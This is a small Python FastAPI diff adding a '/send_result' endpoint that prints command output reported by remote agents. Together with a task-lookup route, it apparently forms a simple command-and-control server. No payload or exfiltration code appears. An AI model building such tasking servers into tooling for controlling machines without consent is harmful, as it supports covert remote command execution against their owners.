@@ -16,5 +16,10 @@ class Agent_Response(BaseModel):
 def get_task(number_task: str):
     return task_mgr.get(number_task, "none")
 
+@app.post("/send_result")
+def send_result(data: Agent_Response):
+    print(f"[+] Результат выполненной команды агентом:\n")
+    print(data.result)
+
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=8080)
